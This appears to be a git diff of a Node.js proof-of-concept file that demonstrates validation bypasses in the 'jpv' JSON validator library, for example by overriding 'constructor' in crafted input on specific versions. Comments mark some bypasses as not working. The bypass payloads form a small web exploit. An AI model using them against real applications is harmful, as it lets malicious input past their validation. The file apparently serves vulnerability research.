@@ -1,6 +1,8 @@
 const express = require('express')
 const jpv = require('jpv')
 
+
+// Bypass check on 2.0.1 for map validation
 function checkJPVMapOrig(input)
 {
 	var mapPattern = 
@@ -18,6 +20,7 @@ function checkJPVMapOrig(input)
 	*/
 }
 
+// Bypass check on 2.0.1 for array validation
 function checkJPVArrayOrig(input)
 {
 	var arrayPattern = {
@@ -27,21 +30,9 @@ function checkJPVArrayOrig(input)
 	return ("Validation bypassed: " + jpv.validate(input, arrayPattern));
 }
 
-//called with every property and its value
-function process(key,value) {
-    console.log(key + " : "+value);
-}
 
-function traverse(o,func) {
-    for (var i in o) {
-       func.apply(this,[i,o[i]]);  
-        if (o[i] !== null && typeof(o[i])=="object") {
-            //going one step down in the object tree!!
-            traverse(o[i],func);
-        }
-    }
-}
 
+// Demo for the constructor bypass on version 2.2.1 
 function exampleJPV()
 {
 	/*
@@ -60,14 +51,14 @@ function exampleJPV()
 
 	
 	const input = {
-		anArray: {
-		  malicious: "problematic input.", 
-		  constructor: [].constructor
+		aMap: {
+		  badcode: "problematic input.", 
+		  constructor: new Map().constructor
 		}
 	};
 
 	const schema = {
-	  anArray: []
+	  aMap: new Map()
 	};
 	
 
@@ -89,6 +80,7 @@ function exampleJPV()
 
 }
 
+// Doesn't work with passed JSON'
 function constructorOverrideUpdated(input)
 {
 	const schema = {
@@ -99,6 +91,7 @@ function constructorOverrideUpdated(input)
 
 }
 
+// Not working at the moment
 function hasOwnPropertyOverride(input)
 {
 	var input= {
@@ -112,6 +105,23 @@ function hasOwnPropertyOverride(input)
 	console.log("Validation is getting bypassed: " + jpv.validate(input, schema)); 
 	return jpv.validate(input, schema);
 
+}
+
+/// Debugging aids
+
+//called with every property and its value
+function process(key,value) {
+    console.log(key + " : "+value);
+}
+
+function traverse(o,func) {
+    for (var i in o) {
+       func.apply(this,[i,o[i]]);  
+        if (o[i] !== null && typeof(o[i])=="object") {
+            //going one step down in the object tree!!
+            traverse(o[i],func);
+        }
+    }
 }
 
 module.exports = {
